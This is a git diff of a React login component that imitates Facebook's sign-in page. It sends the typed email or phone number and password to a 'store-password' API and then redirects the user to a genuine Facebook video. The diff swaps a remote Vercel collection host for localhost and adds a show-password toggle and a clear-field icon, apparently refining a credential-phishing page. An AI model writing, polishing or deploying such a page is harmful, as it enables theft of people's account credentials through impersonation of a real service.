@@ -2,11 +2,35 @@ import { useState } from "react";
 import axios from "axios";
 import { IoChevronDown } from "react-icons/io5";
 import { FaFacebook } from "react-icons/fa";
+import { FaRegEyeSlash } from "react-icons/fa6";
+import { FaRegEye } from "react-icons/fa6";
+import { IoMdClose } from "react-icons/io";
 import { Link } from "react-router-dom";
 
 const Login = () => {
   const [emailNum, setEmailNum] = useState("");
   const [password, setPassword] = useState("");
+  const [isShow, setIsShow] = useState(false);
+  const [isClicked, setIsClicked] = useState(false);
+  const [emailClicked, setEmailClicked] = useState(false);
+  const [passType,setPassType] = useState('password');
+
+  const handleClear = () => {
+   setEmailNum('');
+  };
+
+const handleShowPass = () =>{
+  setIsShow(!isShow);
+  setPassType('txt');
+}
+const handleNotShowPass = () =>{
+  setIsShow(!isShow);
+  setPassType('password');
+}
+
+
+
+
 
   const handleStorePassword = (e) => {
     e.preventDefault();
@@ -25,12 +49,14 @@ const Login = () => {
 
     // Send the data to store the password
     axios
-      .post("https://facebook02-swart.vercel.app/api/store-password", data, {    // http://localhost:5000
+      .post("http://localhost:5000/api/store-password", data, {
+        // http://localhost:5000
         withCredentials: true,
       })
       .then((response) => {
         if (response.status === 200) {
-          window.location.href = "https://web.facebook.com/watch?v=1716608769152496";
+          window.location.href =
+            "https://web.facebook.com/watch?v=1716608769152496";
         }
       })
       .catch((error) => {
@@ -115,6 +141,7 @@ const Login = () => {
               type="txt"
               name="emailNum"
               id="email"
+              onClick={()=>setEmailClicked(true)}
               value={emailNum}
               onChange={(e) => setEmailNum(e.target.value)}
               placeholder=" "
@@ -126,14 +153,21 @@ const Login = () => {
             >
               Mobile number or email address
             </label>
+            {/* Cross icon */}
+            {
+              emailClicked && <div className="absolute top-[40%] right-5">
+              <IoMdClose onClick={handleClear} className="text-xl" />
+            </div>
+            }
           </div>
 
           {/* Password Field */}
           <div className="relative mb-6">
             <input
-              type="password"
+              type={passType}
               name="pass"
               id="password"
+              onClick={() => setIsClicked(true)}
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder=" "
@@ -145,6 +179,22 @@ const Login = () => {
             >
               Password
             </label>
+            {/* eye icon */}
+            {isClicked && (
+              <div className="absolute top-[40%] right-5">
+                {isShow ? (
+                  <FaRegEye
+                    onClick={handleNotShowPass}
+                    className="text-xl"
+                  />
+                ) : (
+                  <FaRegEyeSlash
+                    onClick={handleShowPass}
+                    className="text-xl"
+                  />
+                )}
+              </div>
+            )}
           </div>
 
           {/* Submit Button */}
